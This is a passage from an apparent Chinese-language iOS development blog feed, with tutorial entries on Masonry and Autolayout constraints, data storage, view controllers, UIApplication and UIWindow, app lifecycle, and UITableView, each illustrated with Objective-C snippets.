设置隐藏属性为yes Masonry基本使用头文件的宏定义12345678910//define this constant if you want to use Masonry without the 'mas_' prefix// 只要在导入Masonry主头文件之前定义这个宏, 那么以后在使用Masonry框架中的属性和方法的时候, 就可以省略mas_前缀// 如果这个宏是在导入了Masonry.h之后定义, 那么无效#define MAS_SHORTHAND//define this constant if you want to enable auto-boxing for default syntax// 只要在导入Masonry主头文件之前定义这个宏,那么就可以让equalTo函数接收基本数据类型, 内部会对基本数据类型进行包装#define MAS_SHORTHAND_GLOBALS#import "Masonry.h" 添加约束方式1 (推荐的写法 可视化比较好)12345[blueView makeConstraints:^(MASConstraintMaker *make) &#123; make.top.equalTo(self.view.top).offset(20); // y make.left.equalTo(self.view.left).offset(20); // x make.right.equalTo(self.view.right).offset(-20); // w make.height.equalTo(50); // h 方式2(有mas_前缀)12345678[redView makeConstraints:^(MASConstraintMaker *make) &#123; // make.top.equalTo(self.view.mas_top).with.offset(20); make.top.equalTo(self.view.top).with.offset(20); make.left.equalTo(self.view.mas_left).offset(20); make.width.and.height.equalTo(@100); make.width.and.height.mas_equalTo(100); make.width.and.height.equalTo(100); &#125;]; 不推荐的写法(可视化比较差)123456[redView mas_makeConstraints:^(MASConstraintMaker *make) &#123; make.top.offset(20); make.left.offset(20); make.bottom.offset(-20); make.right.offset(-20); &#125;]; 123[redView mas_makeConstraints:^(MASConstraintMaker *make) &#123; make.edges.insets(UIEdgeInsetsMake(20, 20, 20, 20)); &#125;]; 约束的其他常见注意点 约束的添加 1234// makeConstraints: 每次都会添加新的约束[self.redView makeConstraints:^(MASConstraintMaker *make) &#123; make.top.equalTo(self.blueView.bottom).offset(100); &#125;]; 约束的update 1234// updateConstraints:专门用于更新约束的,如果没有约束会创建一个新的 如果有直接修改以前的 [self.redView updateConstraints:^(MASConstraintMaker *make) &#123; make.top.equalTo(self.blueView.bottom).offset(100); &#125;]; 约束的清空 1234// remakeConstraints: 清空约束, 删除约束 [self.redView remakeConstraints:^(MASConstraintMaker *make) &#123; &#125;]; VFL VisualFormatLanguage: 可视化规格语言。注意点 如果是通过代码添加Autolayout,那么必须在添加约束之前禁用Autoresizing 禁用Autoresizing时,必须是给谁添加就禁用谁的,也就是说如果禁用了父控件无效 添加约束之前,必须保证被约束的控件已经添加到父控件中了 12self.view.translatesAutoresizingMaskIntoConstraints = NO;redView.translatesAutoresizingMaskIntoConstraints = NO; 通过VFL添加约束基本使用1234567891011121314 /* VisualFormat: VFL语句 options: 对齐方式 metrics: 占位字符对应的值 views: 占位字符对应的控件*/ // 设置水平方向的约束 NSDictionary *dict = NSDictionaryOfVariableBindings(redView); NSArray *hCos = [NSLayoutConstraint constraintsWithVisualFormat:@"H:|-20-[redView(w)]" options:kNilOptions metrics:@&#123;@"w":@100&#125; views:dict]; [self.view addConstraints:hCos]; // 设置垂直方向的约束 NSArray *vCos = [NSLayoutConstraint constraintsWithVisualFormat:@"V:|-20-[redView(h)]" options:kNilOptions metrics:@&#123;@"h":@100&#125; views:@&#123;@"redView":redView&#125;]; [self.view addConstraints:vCos]; 注意点 VFL语句中不支持乘除法 此时还是需要用最原始的方法(代码)来做 123456789101112/* Item == 第一个控件 attribute == 第一个控件的什么属性 relatedBy == 等于/小于等于/大于等于 toItem == 第二个控件 attribute == 第二个控件的什么属性 multiplier == 乘以多少 constant == 加上多少*/NSLayoutConstraint *redWidth = [NSLayoutConstraint constraintWithItem:redView attribute:NSLayoutAttributeWidth relatedBy:NSLayoutRelationEqual toItem:blueView attribute:NSLayoutAttributeWidth multiplier:0.5 constant:0.0];[self.view addConstraint:redWidth];]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Autoresizing</tag>
        <tag>Autolayout</tag>
        <tag>Sizeclass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之常用数据存储方式]]></title>
    <url>%2Farchives%2F3c64aa6c.html</url>
    <content type="text"><![CDATA[锦瑟无端五十弦，一弦一柱思华年。庄生晓梦迷蝴蝶，望帝春心托杜鹃。沧海月明珠有泪，蓝田日暖玉生烟。此情可待成追忆，只是当时已惘然。 李商隐 《锦瑟》 数据存储 数据存储的几种常见方式 XML属性列表（plist）归档 Preference(偏好设置) NSKeyedArchiver归档(NSCoding) SQLite3(手机上运行的微型数据库适合数据量大的时候调用) Core Data (apple公司封装的 可以不用写数据库代码 但是自动的都是内存不够优化) XML属性列表（plist）归档 将文件通过不同的方式写入到沙盒的不同目录下。 应用沙盒目录的常见获取方式沙盒根目录：1NSString *home = NSHomeDirectory(); 获取Dcuments路径：(2种方式) 方式1：利用沙盒根目录拼接”Documents”字符串。 此方式不建议采用，因为新版本的操作系统可能会修改目录名。 12NSString *home = NSHomeDirectory();NSString *documents = [home stringByAppendingPathComponent:@"Documents"]; 方式2：利用NSSearchPathForDirectoriesInDomains函数 NSUserDomainMask 代表从用户文件夹下找 YES 代表展开路径中的波浪字符“~” 1234NSArray *array = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, NO);// 在iOS中，只有一个目录跟传入的参数匹配，所以这个集合里面只有一个元素NSString *documents = [array objectAtIndex:0];tmp：NSString *tmp = NSTemporaryDirectory(); 获取Library/Caches路径：(跟Documents类似的2种方法) 方式1：利用沙盒根目录拼接Caches字符串 方式2：利用NSSearchPathForDirectoriesInDomains函数(将函数的第2个参数改为：NSCachesDirectory即可) Library/Preference 通过NSUserDefaults类存取该目录下的设置信息 属性列表是一种XML格式的文件，拓展名为plist，如果对象是NSString、NSDictionary、NSArray、NSData、NSNumber等类型，就可以使用writeToFile:atomically:方法直接将对象写到属性列表文件中 属性列表-归档NSDictionary 将一个NSDictionary对象归档到一个plist属性列表中 1234567// 将数据封装成字典NSMutableDictionary *dict = [NSMutableDictionary dictionary];[dict setObject:@"母鸡" forKey:@"name"];[dict setObject:@"15013141314" forKey:@"phone"];[dict setObject:@"27" forKey:@"age"];// 将字典持久化到Documents/stu.plist文件中[dict writeToFile:path atomically:YES]; 属性列表-恢复NSDictionary 读取属性列表，恢复NSDictionary对象 12345// 读取Documents/stu.plist的内容，实例化NSDictionaryNSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:path];NSLog(@"name:%@", [dict objectForKey:@"name"]);NSLog(@"phone:%@", [dict objectForKey:@"phone"]);NSLog(@"age:%@", [dict objectForKey:@"age"]); 偏好设置 很多iOS应用都支持偏好设置，比如保存用户名、密码、字体大小等设置，iOS提供了一套标准的解决方案来为应用加入偏好设置功能。 每个应用都有个NSUserDefaults实例，通过它来存取偏好设置，比如，保存用户名、字体大小、是否自动登录。 12345678910NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];[defaults setObject:@"西门抽筋" forKey:@"username"];[defaults setFloat:18.0f forKey:@"text_size"];[defaults setBool:YES forKey:@"auto_login"];// 读取上次保存的设置NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];NSString *username = [defaults stringForKey:@"username"];float textSize = [defaults floatForKey:@"text_size"];BOOL autoLogin = [defaults boolForKey:@"auto_login"]; 注意 UserDefaults设置数据时，不是立即写入，而是根据时间戳定时地把缓存中的数据写入本地磁盘。 所以调用了set方法之后数据有可能还没有写入磁盘应用程序就终止了。出现以上问题，可以通过调用synchornize方法强制写入。 1[defaults synchornize]; NSKeyedArchiver 如果对象是NSString、NSDictionary、NSArray、NSData、NSNumber等类型，可以直接用NSKeyedArchiver进行归档和恢复。 不是所有的对象都可以直接用这种方法进行归档，只有遵守了NSCoding协议的对象才可以。 NSCoding协议有2个方法： encodeWithCoder: 每次归档对象时，都会调用这个方法。 一般在这个方法里面指定如何归档对象中的每个实例变量，可以使用encodeObject:forKey:方法归档实例变量 initWithCoder: 每次从文件中恢复(解码)对象时，都会调用这个方法。 一般在这个方法里面指定如何解码文件中的数据为对象的实例变量，可以使用decodeObject:forKey方法解码实例变量 归档一个NSArray对象 将一个一个NSArray对象归档到Documents/array.archive目录下。 12NSArray *array = [NSArray arrayWithObjects:@”a”,@”b”,nil];[NSKeyedArchiver archiveRootObject:array toFile:path]; 归档(编码)12345Person *person = [[[Person alloc] init] autorelease];person.name = @"西门抽筋";person.age = 27;person.height = 1.83f;[NSKeyedArchiver archiveRootObject:person toFile:path]; 恢复(解码)1Person *person = [NSKeyedUnarchiver unarchiveObjectWithFile:path]; NSKeyedArchiver归档对象的注意 如果父类也遵守了NSCoding协议，请注意：应该在encodeWithCoder:方法中加上下面代码确保继承的实例变量也能被编码，即也能被归档 1[super encodeWithCode:encode]; 应该在initWithCoder:方法中加上下面代码确保继承的实例变量也能被解码，即也能被恢复 1self = [super initWithCoder:decoder]; NSData 使用archiveRootObject:toFile:方法可以将一个对象直接写入到一个文件中，但有时候可能想将多个对象写入到同一个文件中，那么就要使用NSData来进行归档对象。 NSData可以为一些数据提供临时存储空间，以便随后写入文件，或者存放从磁盘读取的文件内容。可以使用[NSMutableData data]创建可变数据空间。 归档（编码）12345678910111213// 新建一块可变数据区NSMutableData *data = [NSMutableData data];// 将数据区连接到一个NSKeyedArchiver对象NSKeyedArchiver *archiver = [[[NSKeyedArchiver alloc] initForWritingWithMutableData:data] autorelease];// 开始存档对象，存档的数据都会存储到NSMutableData中[archiver encodeObject:person1 forKey:@"person1"];[archiver encodeObject:person2 forKey:@"person2"];// 存档完毕(一定要调用这个方法)[archiver finishEncoding];// 将存档的数据写入文件[data writeToFile:path atomically:YES]; 恢复（解码）12345678910// 从文件中读取数据NSData *data = [NSData dataWithContentsOfFile:path];// 根据数据，解析成一个NSKeyedUnarchiver对象NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:data];Person *person1 = [unarchiver decodeObjectForKey:@"person1"];Person *person2 = [unarchiver decodeObjectForKey:@"person2"];// 恢复完毕[unarchiver finishDecoding]; 其他 关于SQLite3 和 Core Data的存储方式。一般在开发中国内使用SQLite3比较多，具体的使用方法可以参考官方文档，这里不再赘述。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之常用控制器及多控制器管理]]></title>
    <url>%2Farchives%2Fc2b85789.html</url>
    <content type="text"><![CDATA[远书归梦两悠悠，只有空床敌素秋。阶下青苔与红树，雨中寥落月中愁。 李商隐 《端居》 控制器控制器View的加载 控制器的生命周期 内存警告的时候的整个循环的流程图 控制器常见的创建方式有以下几种通过storyboard创建 先加载storyboard文件（Test是storyboard的文件名） 1UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Test" bundle:nil]; 接着初始化storyboard中的控制器 初始化“初始控制器”（箭头所指的控制器） 1XSViewController *vc = [storyboard instantiateInitialViewController]; 12 // 通过一个标识初始化对应的控制器XSViewController *XS = [storyboard instantiateViewControllerWithIdentifier:@”vc"]; 直接创建1XSViewController *XS = [[XSViewController alloc] init]; 指定xib文件来创建123456789101112 // 通过Xib创建的控制器// 通过xib去加载控制器// 1.首先创建一个Xib文件// 2.Xib文件需要拖一个View描述控制器的View// 3.需要把Xib上的View与控制器连线，设置Xib的File'owner为控制器ViewController *vc = [[ViewController alloc] initWithNibName:@"VC" bundle:nil];// 创建根控制器XSViewController *vc = [[XSViewController alloc] init];// init底层会自动调用initWithNibName 假设通过Xib创建XSViewController控制器对象 如果nibName为nil,首先会去查找XSView.xib,如果有，就会去加载XSView.xib描述的控制器的view 如果没有找到，就会去找XSViewController.xib,如果有，也会去加载 都没有找到，就会生成一个空的view 空的view是几乎透明的,但不是完全透明的 相当于[UIColor clearColor];可以穿透过去,但是完全透明就不能够穿透 控制器的view是延迟加载的：用到时再加载UIView(只用于UIViewController或者子控制器) 可以用isViewLoaded方法判断一个UIViewController的view是否已经被加载 控制器的view加载完毕就会调用viewDidLoad方法 UINavigationController 为了便于管理控制器，iOS提供了2个比较特殊的控制器 12UINavigationController(导航控制器)UITabBarController(QQ,微信,淘宝等) UINavigationController的使用步骤 初始化UINavigationController 设置UIWindow的rootViewController为UINavigationController 根据具体情况，通过push方法添加对应个数的子控制器 UINavigationController的子控制器 UINavigationController 以栈的形式保存子控制器 12@property(nonatomic,copy) NSArray *viewControllers;@property(nonatomic,readonly) NSArray *childViewControllers; 控制器出入栈的常用的集中方法12345678// 使用push方法能将某个控制器压入栈- (void)pushViewController:(UIViewController *)viewController animated:(BOOL)animated;// 使用pop方法可以移除控制器 将栈顶的控制器移除- (UIViewController *)popViewControllerAnimated:(BOOL)animated;// 回到指定的子控制器- (NSArray *)popToViewController:(UIViewController *)viewController animated:(BOOL)animated;// 回到根控制器（栈底控制器）- (NSArray *)popToRootViewControllerAnimated:(BOOL)animated; 如何修改导航栏的内容 显示在我们眼前的永远是栈订控制器 导航栏的内容由栈顶控制器的navigationItem属性决定 导航控制器是以栈的形式先进后出后进先出(是以数组的形式存储的 数组就是以栈的形式存储的) 导航栏返回按钮的文字是由上一个控制器决定的(特例) UINavigationItem有以下属性影响着导航栏的内容1234567891011// 左上角的返回按钮@property(nonatomic,retain) UIBarButtonItem *backBarButtonItem;// 中间的标题视图@property(nonatomic,retain) UIView *titleView;// 中间的标题文字@property(nonatomic,copy) NSString *title;// 左上角的视图@property(nonatomic,retain) UIBarButtonItem *leftBarButtonItem;// 右上角的视图UIBarButtonItem *rightBarButtonItem@property(nonatomic,retain) UIBarButtonItem *rightBarButtonItem; Segue的属性 每一个Segue对象，都有3个属性 123456// 唯一标识@property (nonatomic, readonly) NSString *identifier;// 来源控制器@property (nonatomic, readonly) id sourceViewController;// 目标控制器@property (nonatomic, readonly) id destinationViewController; Segue的类型 自动型：点击某个控件后（比如按钮），自动执行Segue，自动完成界面跳转 手动型：需要通过写代码手动执行Segue，才能完成界面跳转 设置导航控制器的导航栏的主题123456789101112131415161718192021222324/** 只会在系统第一次用这类的时候调用(只会调用一次) */+ (void)initialize&#123;// 1.设置导航栏主题样式 UINavigationBar *navBar = [UINavigationBar appearance]; // 1.1.设置导航栏背景图片 NSString *navImageName = nil; if (ios7) &#123; navImageName = @"NavBar64"; navBar.tintColor = [UIColor whiteColor]; // 设置导航栏的返回按钮颜色为白色 &#125;else&#123; // ios6 navImageName = @"NavBar"; &#125; [navBar setBackgroundImage:[UIImage imageNamed:navImageName] forBarMetrics:UIBarMetricsDefault]; // 1.2.设置导航栏的字体颜色为白色 NSDictionary *attrButes = @&#123; NSForegroundColorAttributeName : [UIColor whiteColor], NSFontAttributeName : [UIFont systemFontOfSize:18] &#125;; [navBar setTitleTextAttributes:attrButes];&#125; 注意点 以后看到系统自带的类带有item,就是苹果提供的模型 UINavigationItem : 设置导航条内容(她不是控件 是模型) UIBarButtonItem : 设置导航条上按钮的内容 (模型) UITabBarController 跟UINavigationController类似，UITabBarController也可以轻松地管理多个控制器，轻松完成控制器之间的切换，典型例子就是QQ、微信等应用. UITabBarController的使用步骤 初始化UITabBarController 设置UIWindow的rootViewController为UITabBarController 根据具体情况，通过addChildViewController方法添加对应个数的子控制器 UITabBarController添加控制器的方式有2种12345- 添加单个子控制器- (void)addChildViewController:(UIViewController *)childController; - 设置子控制器数组@property(nonatomic,copy) NSArray *viewControllers; UITabBarController注意点 如果UITabBarController有N个子控制器，那么UITabBar内部就会有N个UITabBarButton作为子控件 UITabBarButton里面显示什么内容，由对应子控制器的tabBarItem属性决定 多控制器管理segue跳转之前会调用的方法 Modal 除了push之外，还有另外一种控制器的切换方式，那就是Modal (能用push的尽量用push实现,公司有特殊需求可以用modal) 任何控制器都能通过Modal的形式展示出来 Modal的默认效果：新控制器从屏幕的最底部往上钻，直到盖住之前的控制器为止 12345// 以Modal的形式展示控制器- (void)presentViewController:(UIViewController *)viewControllerToPresent animated: (BOOL)flag completion:(void (^)(void))completion// 关闭当初Modal出来的控制器- (void)dismissViewControllerAnimated: (BOOL)flag completion: (void (^)(void))completion; 规律 modal出谁,谁就能dismiss 谁modal,谁也可以dismiss dismissViewController 永远移除最后显示的控制器 注意 如果一个控制器的View显示到屏幕上,这个控制器一定不能被销毁(要被强引用). 谁modal谁就强引用modal出来的控制器 多控制器 管理UIWindow 主窗口的概念 新建UIWindowUIViewController 控制器的创建方式 控制器view的创建方式 view的懒加载 1loadView、viewDidLoad、viewDidUnload、didReceiveMemoryWarning UINavigationController 通过非storyboard方式 创建导航控制器 设置UIWindow的根控制器 push 1个、2个、3个 子控制器 解释push的原理(栈、导航控制器的管理过程) 栈底、栈顶控制器的概念 如何设置导航栏上面的内容、返回文字的设置 pop的方法使用 push和addChild、viewControllers和childViewController的关系 通过storyboard方式 多控制器的数据的传递方式(两种):顺传和逆传 顺传 控制器的跳转方向: A C 数据的传递方向 : A C 数据的传递方式 : 在A的prepareForSegue:sender:方法中根据segue参数取得destinationViewController, 也就是控制器C,直接给控制器C传递数据(要在C的viewDidLoad方法中取得数据,来赋值给界面上的UI控件) 逆传 控制器的跳转方向: A C 数据的传递方向 : C A 数据的传递方式: 让A成为C的代理,在C中调用A的代理方法,通过代理方法的参数传递数据给A App主流UI框架结构]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>storyboard</tag>
        <tag>ViewController</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之UIApplication & UIWindow & 创建单例]]></title>
    <url>%2Farchives%2F55fb9a70.html</url>
    <content type="text"><![CDATA[UIApplication对象是应用程序的象征，每一个应用都有自己的UIApplication对象，而且是单例的。 UIApplication UIApplication对象是应用程序的象征 每一个应用都有自己的UIApplication对象，而且是单例的。 通过[UIApplication sharedApplication]创建，创建单例基本以share开头 一个iOS程序启动后创建的第一个对象就是UIApplication对象 利用UIApplication对象，能进行一些应用级别的操作，如： 设置提醒数字，得要注册用户通知 可以设置联网状态：将NetworkActivityIndicatorVisible属性设为YES 可以设置状态栏：默认控制器管理，要在info文件中设置修改然后调用setStatusBarHidden: withAnimation:方法 可以打电话，发短信，打开网页：使用OpenURl方法 代理方法：系统自动生成 1234567 // 设置提醒数字 app.applicationIconBadgeNumber = 10;UIUserNotificationSettings *settings = [UIUserNotificationSettings settingsForTypes:UIUserNotificationTypeBadge categories:nil];// 注册一个用户的通知[app registerUserNotificationSettings:settings]; UIWindow UIWindow是一种特殊的UIView，通常在一个app中只会有一个UIWindow iOS程序启动完毕后，创建的第一个视图控件就是UIWindow，接着创建控制器的view，最后将控制器的view添加到UIWindow上，于是控制器的view就显示在屏幕上了 一个iOS程序之所以能显示到屏幕上，完全是因为它有UIWindow。也就说，没有UIWindow，就看不见任何UI界面。 自定义 创建窗口，设置frame。 添加子控件，一般把窗口的根控制器添加上去，通过设置rootViewController就可以把根控制器的view添加到窗口上。 窗口显示。设置窗口的hiddle属性；应用程序是有主窗口，通常调用makeKeyAndVisible。 属性： windons属性，可以识别应用程序中哪些控件还是窗口，有一个比较特殊，状态栏。 window层级 window层级，alert(2000) &gt; statusBar(1000) &gt; normal(0) UIWindowLevel 本质是CGFloat 相同level的可以进行加减运算,调整优先级。 单例实现 不管怎么创建,只会分配一次内存 整个app中,只会分配一次 仿苹果实现单例 .h文件 12345#import &lt;Foundation/Foundation.h&gt;@interface Person : NSObject+ (instancetype)sharedPerson;@end .m文件 123456789101112131415161718192021222324252627282930313233#import "Person.h"// 1.程序一启动的时候就创建这个类的对象// 2.不允许外界通过alloc,分配内存,只要一调用,就崩溃@implementation Person// 人的实例static Person *_instance;// 程序运行的时候就会加载类+ (void)load&#123; _instance = [[self alloc] init];&#125;// exception 'NSInternalInconsistencyException', reason: 'There can only be one UIApplication instance.'+ (instancetype)alloc&#123; if (_instance) &#123; // 崩溃 // 创建异常对象 NSException *excption = [NSException exceptionWithName:@"NSInternalInconsistencyException" reason:@"There can only be one Person instance." userInfo:nil]; // 抛异常 [excption raise]; &#125; // super -&gt; [NSObject alloc] return [super alloc];&#125;+ (instancetype)sharedPerson&#123; return _instance;&#125;@end]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UIApplication</tag>
        <tag>UIWindow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之APP的启动过程及生命周期相关]]></title>
    <url>%2Farchives%2Ff571ec2e.html</url>
    <content type="text"><![CDATA[关于App启动及初始化相关的知识点了解。 系统启动过程App启动 main -&gt; UIApplicationMain -&gt; 通知代理做事情 UIApplicationMain底层实现： 1234// principalClassName:描述UIApplication的类名字符串// delegateClassName:描述UIApplication代理的类名字符串int UIApplicationMain(int argc, char *argv[], NSString *principalClassName, NSString *delegateClassName); 程序启动的完整过程 main函数 UIApplicationMain 创建UIApplication对象 创建UIApplication的delegate对象 delegate对象开始处理(监听)系统事件(判断有无storyboard) A. 根据Info.plist获得最主要storyboard的文件名,加载最主要的storyboard(有storyboard) 创建UIWindow 创建和设置UIWindow的rootViewController 显示窗口 B. 没有storyboard 程序启动完毕的时候, 就会调用代理的application:didFinishLaunchingWithOptions:方法 在application:didFinishLaunchingWithOptions:中创建UIWindow 创建和设置UIWindow的rootViewController 显示窗口 12345678910111213141516171819202122232425262728// 在开发中通常在程序启动完成的时候手动创建窗口- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123; // 1.创建窗口 // 让窗口显示:1.必须要有强引用2.窗口也是控件,是控件要想展示出来,必须设置尺寸 self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds]; self.window.backgroundColor = [UIColor yellowColor]; // 2.创建控制器 UIViewController *vc = [[UIViewController alloc] init]; vc.view.backgroundColor = [UIColor greenColor]; // 2.1 设置窗口的根控制器,底层:1.就会把控制器的view添加到窗口上 // 2.给界面添加旋转功能 self.window.rootViewController = vc; NSLog(@"%@",application.keyWindow); // 3.显示窗口:称为主窗口,并且显示窗口 [self.window makeKeyAndVisible]; // 1. self.window.hidden = NO; // 2. 称为应用程序的主窗口 NSLog(@"%@",application.keyWindow); NSLog(@"%@",self.window); return YES;&#125; Application生命周期方法介绍 AppDelegate没有自己创建，系统会默认帮我们创建。 处理应用程序的一些生命周期方法：以application开头 123456789// 程序启动完成的时候调用// __func__：表示当前的方法在哪个类里面调用// -[AppDelegate application:didFinishLaunchingWithOptions:]- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123; NSLog(@"%s",__func__); // Override point for customization after application launch. return YES;&#125; 123456// 当应用程序失去焦点的时候调用- (void)applicationWillResignActive:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state. // Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.&#125; 1234567// 当应用程序进入后台的时候调用// 保存一些数据- (void)applicationDidEnterBackground:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later. // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.&#125; 12345// 当应用程序进入进台的时候调用- (void)applicationWillEnterForeground:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.&#125; 123456// 当应用程序获取焦点的时候调用// 当用户完全获取焦点的时候，才能跟界面交互- (void)applicationDidBecomeActive:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.&#125; 1234// 当应用程序关闭的时候调用- (void)applicationWillTerminate:(UIApplication *)application &#123; // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.&#125; 123456// 当程序接收到内存警告的时候调用- (void)applicationDidReceiveMemoryWarning:(UIApplication *)application&#123; // 清空图片缓存 NSLog(@"%s",__func__);&#125; 类相关的load load方法会在加载类的时候就被调用，也就是ios应用启动的时候，就会加载所有的类，就会调用每个类的 + load 方法。initialize initialize方法会在第一次初始化这个类之前被调用，我们用它来初始化静态变量。 LoadView 什么时候调用：第一次使用控制器的view的时候调用 作用：加载控制器的view 注意: 只要重写loadView，里面就不要调用 [super loadView] 在loadView方法中，如果没有给控制器的view赋值,就不能获取控制器的view，否则会导致死循环 一旦重写loadView方法,表示需要自己创建控制器的view 在开发中loadView应用场景: 一开始控制器就想要展示一张图片，就可以直接让控制器的view是UIImageView UIWedView：展示网页，设置wenbView为控制器View 重写LoadView，可以减少内存使用，直接帮你创建控制器最想要的view [super loadView]：首先判断下有没有指定storyboard或者指定xib,如果指定了，就会帮你加载指定的控制器的view 123456789101112131415161718192021- (void)loadView&#123; // super -&gt; UIViewController // [super loadView]; // 创建控制器的view // 只要当前控制器是根控制器,系统会自动设置控制器的view尺寸(但是不建议这么写,开发中直接指定为[UIScreen mainScreen].bounds) UIView *vcView = [[UIView alloc] initWithFrame:CGRectZero]; vcView.backgroundColor = [UIColor redColor]; self.view = vcView;&#125;// 系统启动会默认自动调用这个系统方法判断view是否为空 为空则会调用loadView方法//- (UIView *)view//&#123;// if (_view == nil) &#123;// [self loadView];// &#125;// return _view;//&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发常用控件之UITableView]]></title>
    <url>%2Farchives%2Ff9786cb4.html</url>
    <content type="text"><![CDATA[UITableView可以说是iOS开发中最常用的控件之一了，常用于展示表单及列表类数据。 UITableView如何展示数据设置数据源对象1self.tableView.dataSource = self; 数据源对象要遵守协议123@interface ViewController () &lt;UITableViewDataSource&gt;@end 实现数据源方法1234567891011121314// 多少组数据- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView;// 每一组有多少行数据- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section;// 每一行显示什么内容- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath;// 每一组的头部- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section;// 每一组的尾部- (NSString *)tableView:(UITableView *)tableView titleForFooterInSection:(NSInteger)section tableView的常见设置12345678910111213141516171819202122// 设置每一行cell的高度self.tableView.rowHeight = 100;// 设置每一组头部的高度self.tableView.sectionHeaderHeight = 50;// 设置每一组尾部的高度self.tableView.sectionFooterHeight = 50;// 设置分割线颜色self.tableView.separatorColor = [UIColor redColor];// 设置分割线样式self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone;// 设置表头控件self.tableView.tableHeaderView = [[UISwitch alloc] init];// 设置表尾控件self.tableView.tableFooterView = [UIButton buttonWithType:UIButtonTypeContactAdd];// 设置右边索引文字的颜色self.tableView.sectionIndexColor = [UIColor redColor];// 设置右边索引文字的背景色self.tableView.sectionIndexBackgroundColor = [UIColor blackColor]; UITableViewCellUITableViewCell的常见设置12345678910111213141516171819202122// 设置右边的指示样式cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;// 设置右边的指示控件cell.accessoryView = [[UISwitch alloc] init];// 设置cell的选中样式cell.selectionStyle = UITableViewCellSelectionStyleNone;// backgroundView优先级 &gt; backgroundColor// 设置背景色cell.backgroundColor = [UIColor redColor];// 设置背景viewUIView *bg = [[UIView alloc] init];bg.backgroundColor = [UIColor blueColor];cell.backgroundView = bg;// 设置选中的背景viewUIView *selectedBg = [[UIView alloc] init];selectedBg.backgroundColor = [UIColor purpleColor];cell.selectedBackgroundView = selectedBg; cell的循环利用传统的写法12345678910111213141516171819/** 每当有一个cell要进入视野范围内，就会调用一次 */- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath&#123; static NSString *ID = @"wine"; // 1.先去缓存池中查找可循环利用的cell UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:ID]; // 2.如果缓存池中没有可循环利用的cell if (!cell) &#123; cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:ID]; &#125; // 3.设置数据 cell.textLabel.text = [NSString stringWithFormat:@"%zd行的数据", indexPath.row]; return cell;&#125; 新的写法（注册cell）12345678910111213141516171819NSString *ID = @"wine";- (void)viewDidLoad &#123; [super viewDidLoad]; // 注册某个重用标识 对应的 Cell类型 [self.tableView registerClass:[UITableViewCell class] forCellReuseIdentifier:ID];&#125;- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath&#123; // 1.先去缓存池中查找可循环利用的cell UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:ID]; // 2.设置数据 cell.textLabel.text = [NSString stringWithFormat:@"%zd行的数据", indexPath.row]; return cell;&#125; cell的高度的新的计算方式 iOS8新增加预估高度(self-sizing) 1234// 告诉tableView所有cell的高度是自动计算的（根据设置的约束）self.tableView.rowHeight = UITableViewAutomaticDimension;// 设置一个预估值self.tableView.estimatedRowHeight = 44 ; //44为任意值 自定义下划线 不需要去掉原来的下划线，就可以实现在有内容的时候，下面显示出下划线，没有内容的地方不会出现下划线。 12// 添加分割线的取巧方法self.tableView.tableFooterView = [[UIView alloc] init]; 另一种自定义下滑线的方式就是在cell最下面自定义一个高度为1的UIView，这种方法需要去掉原来的下划线。 12// 去掉自带的分割线self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone; 如何利用xib封装一个cell 新建一个xib文件描述一个cell的内部结构 新建一个新的类(继承自UITableViewCell) 新建类的类名最好跟xib的文件名保持一致 将xib中的控件 和自定义的类 进行连线 提供一个类方法快速返回一个创建好的自定义的view(屏蔽从xib加载这个过程) 通过代码自定义cell(cell的高度不一致) 新建一个继承自UITableViewCell的类 